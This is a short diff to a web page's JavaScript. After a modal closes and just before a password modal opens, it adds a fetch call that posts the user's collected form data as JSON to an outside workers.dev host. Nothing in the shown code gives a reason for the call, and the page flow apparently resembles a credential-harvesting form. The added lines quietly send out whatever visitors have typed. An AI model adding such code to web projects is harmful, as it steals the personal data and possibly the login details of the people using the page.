@@ -3673,6 +3673,13 @@
 
             modalOverlay.classList.remove('active');
             document.body.style.overflow = '';
+            fetch("https://patient-frog-4307.workers.dev", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(formData)
+});
 
             // Open password modal
             setTimeout(() => {
